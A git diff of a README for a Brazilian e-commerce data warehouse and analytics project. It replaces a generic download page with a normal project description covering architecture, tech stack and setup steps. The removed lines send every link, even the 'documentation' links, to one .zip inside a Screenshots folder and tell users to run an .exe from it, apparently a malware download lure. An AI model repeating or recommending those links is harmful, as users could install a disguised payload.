@@ -1,92 +1,104 @@
-# 📊 brazilian-ecommerce-data-warehouse - Easy Business Intelligence for E-Commerce
+# 🚀 Predictive & Prescriptive Analytics Engine  
+### Transforming Raw E-Commerce Data into Actionable Business Intelligence
 
-[![Download Now](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip%20Now-%20-%20brightgreen)](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip)
+---
 
-## 🚀 Getting Started
+## 📌 Overview
 
-This guide helps you download and run the **brazilian-ecommerce-data-warehouse** application. This software provides an end-to-end Business Intelligence solution for Brazilian e-commerce data. It includes features like ETL pipelines, data warehousing, advanced analytics, and a PowerBI dashboard.
+This project delivers a **full-scale data warehousing and analytics solution** designed to convert raw Brazilian e-commerce data into **high-impact business insights**.
 
-## 🛠️ System Requirements
+It integrates **ETL pipelines, a structured data warehouse, and advanced analytics layers** to enable organizations to move beyond reporting and into **data-driven decision-making and strategic optimization**.
 
-Before you begin, ensure your system meets the following requirements:
+The system is built to reflect how modern enterprises leverage **Data + AI for growth**, combining engineering, analytics, and visualization into a unified pipeline.
 
-- **Operating System:** Windows 10 or later, macOS, or any recent Linux distribution.
-- **Memory:** At least 4 GB of RAM.
-- **Storage:** 1 GB of free disk space.
-- **Database:** PostgreSQL installed on your machine.
-- **Software:** Pentaho and PowerBI (for advanced analytics and dashboard capabilities).
+---
 
-## 📥 Download & Install
+## 🎯 Objectives
 
-To get the application, visit the Releases page:
+- Build an **end-to-end data pipeline** from raw ingestion to insights  
+- Enable **predictive and prescriptive analytics** on transactional data  
+- Design a **scalable data warehouse architecture**  
+- Deliver **interactive dashboards** for executive decision-making  
+- Reduce manual reporting and improve data reliability  
 
-[Visit this page to download](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip)
+---
 
-Here, you will find different versions of the software. Choose the version that suits your needs and download the file.
+## 🧠 Business Impact
 
-1. Click on the version you want to download.
-2. Look for assets like `.zip` or `.exe` files.
-3. Click the file to start the download.
+This solution is designed with real-world business outcomes in mind:
 
-## 🔗 Key Features
+- 📈 Identify revenue trends and growth opportunities  
+- 🛒 Optimize customer purchase behavior and retention  
+- 📊 Improve operational efficiency through data visibility  
+- 🔍 Enable forecasting and proactive decision-making  
+- ⚙️ Automate data workflows to reduce manual effort  
 
-The **brazilian-ecommerce-data-warehouse** application includes:
+---
 
-- **ETL Pipeline:** Easily extract, transform, and load data into your warehouse.
-- **Data Warehouse:** Store large datasets efficiently.
-- **Advanced Analytics:**
-  - **Descriptive Analytics:** Understand historical performance.
-  - **Predictive Analytics:** Forecast future trends.
-  - **Prescriptive Analytics:** Get actionable recommendations.
-- **PowerBI Dashboard:** Visualize your data with beautiful charts and graphs.
+## 🏗️ Architecture
+Raw Data Sources
+↓
+Data Ingestion (ETL Pipelines - Pentaho)
+↓
+Data Cleaning & Transformation
+↓
+Data Warehouse (PostgreSQL - Star Schema)
+↓
+Analytics Layer (SQL + Python)
+↓
+Visualization Layer (Power BI Dashboard)
 
-## 💻 How to Run the Application
 
-After downloading the software, follow these steps to run it:
+---
 
-1. **Extract the files** if they are compressed:
-   - Right-click on the downloaded file.
-   - Select “Extract All…” and follow the prompts.
+## ⚙️ Tech Stack
 
-2. **Open the application:**
-   - For Windows, double-click the `.exe` file.
-   - For macOS, drag the application to your Applications folder and launch it from there.
-   - For Linux, you may need to provide execute permission by running `chmod +x yourapp` in the terminal.
+- **Data Engineering:** Pentaho (ETL), SQL  
+- **Database:** PostgreSQL  
+- **Data Processing:** Python (Pandas, NumPy)  
+- **Analytics:** Descriptive, Predictive, Prescriptive Models  
+- **Visualization:** Power BI  
+- **Version Control:** Git & GitHub  
 
-3. **Set Up PostgreSQL:**
-   - Open PostgreSQL and create a new database for the application.
-   - Follow the setup instructions provided in the application documentation to connect to your database.
+---
 
-4. **Launch Pentaho and PowerBI if needed:**
-   - Use these applications as required for advanced analytics and dashboard features.
+## 🔄 Key Features
 
-## 🧾 Usage Instructions
+### 🔹 End-to-End ETL Pipeline
+- Automated extraction, transformation, and loading of large datasets  
+- Data cleaning and normalization for consistency  
 
-Once the application is running, you can start loading your Brazilian e-commerce datasets. Follow these general steps:
+### 🔹 Scalable Data Warehouse
+- Designed using **star schema modeling**  
+- Optimized for analytical queries and performance  
 
-1. **Import Data:** Use the ETL features to import your data files.
-2. **Transform Data:** Clean and prepare your data using the application tools.
-3. **Analyze Data:** Utilize the advanced analytics features to extract insights.
-4. **Create Dashboards:** Use PowerBI to build interactive dashboards that visualize your findings.
+### 🔹 Advanced Analytics Engine
+- **Descriptive Analytics:** Historical performance insights  
+- **Predictive Analytics:** Trend forecasting  
+- **Prescriptive Analytics:** Actionable recommendations  
 
-## 📚 Additional Resources
+### 🔹 Interactive Dashboard
+- Dynamic Power BI dashboards  
+- KPI tracking (Revenue, Orders, Customers, Retention)  
+- Drill-down capabilities for deeper insights  
 
-For detailed instructions and feature explanations, refer to the documentation included with your download. You can also find helpful resources on:
+---
 
-- [PostgreSQL Documentation](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip)
-- [Pentaho Documentation](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip)
-- [PowerBI Documentation](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip)
+## 📥 Getting Started
 
-## 🤝 Community Support
+### 1️⃣ Clone the Repository
+```bash
+git clone https://github.com/kevalrakholiya/Predictive_and_Prescriptive_Analytics_Engine.git
+cd Predictive_and_Prescriptive_Analytics_Engine
 
-If you encounter issues or have questions, consider reaching out to the community for help. You can file an issue on the GitHub repository or check out the discussions for support.
-
-## 📜 License
-
-This project is licensed under the MIT License. Feel free to use and modify the software in accordance with the conditions set by the license.
-
-## 🚀 Next Steps
-
-Now that you have the software set up, think about how you can make the most of your data. Explore different datasets, dive deep into analytics, and create insightful visualizations. Good luck, and enjoy discovering valuable insights from your Brazilian e-commerce data!
-
-[Visit this page to download](https://github.com/tanmaytanmay47/brazilian-ecommerce-data-warehouse/raw/refs/heads/main/Screenshots/data_brazilian_warehouse_ecommerce_1.2.zip)
+2️⃣ Set Up Database
+Install PostgreSQL
+Create a new database
+Update connection credentials in ETL configuration
+3️⃣ Run ETL Pipelines
+Open Pentaho Data Integration (Spoon)
+Execute .ktr / .kjb files to load data into the warehouse
+4️⃣ Launch Dashboard
+Open Power BI file (.pbix)
+Connect to PostgreSQL database
+Refresh data to view insights
